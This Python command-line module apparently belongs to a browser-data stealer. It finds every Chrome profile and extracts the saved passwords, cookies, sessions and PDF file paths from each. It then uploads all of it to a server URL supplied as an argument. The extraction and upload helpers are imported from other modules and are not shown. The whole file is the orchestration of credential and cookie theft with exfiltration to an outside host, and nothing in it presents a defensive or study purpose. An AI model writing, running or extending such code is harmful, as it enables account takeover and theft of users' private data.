import argparse
import asyncio
import sys
from .extractor import get_chrome_profiles, extract_all
from .uploader import upload_all

async def main(server_url):
    profiles = get_chrome_profiles()
    if not profiles:
        print("No Chrome profiles found.")
        sys.exit(1)
    profiles_data = [extract_all(p) for p in profiles]
    # Flatten PER PROFILE to match PDFs correctly
    upload_pairs = []
    for d in profiles_data:
        flat_data = []
        flat_data.extend(d["passwords"])
        flat_data.extend(d["cookies"])
        flat_data.append({"sessions": d["sessions"]})
        upload_pairs.append((flat_data, d["pdf_paths"]))
    await upload_all(server_url, upload_pairs)

def cli_main():
    parser = argparse.ArgumentParser(description="Extract Chrome data and upload to server")
    parser.add_argument("server_url", help="FastAPI server URL (e.g., https://your-server.com)")
    args = parser.parse_args()
    asyncio.run(main(args.server_url))